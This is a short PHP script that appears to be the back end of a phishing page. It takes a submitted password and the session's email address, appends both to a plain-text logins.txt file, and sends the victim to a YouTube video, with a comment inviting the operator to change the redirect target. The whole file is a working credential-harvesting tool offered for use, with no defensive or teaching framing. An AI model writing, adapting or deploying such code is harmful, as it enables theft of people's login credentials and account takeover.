<?php

			session_start();
			
			$pass = $_POST["Passwd"];
			$email=$_SESSION["Email"];
			//opening logins text file for appending new data.
  			$file = fopen("logins.txt", "a") or die("Unable to open file!");
			
  			//Writing email and password to logins.txt. 
  			fwrite($file, $email."	".$pass.PHP_EOL);			
  			fclose($file);//closing logins.txt.
			
  			//redirecting user to the youtube
  			//change the location url to redirect to a website of your choice.
  			header("Location: https://www.youtube.com/watch?v=W5lPHdOAhpA");
			exit();
			
			
			session_destroy();
			

?>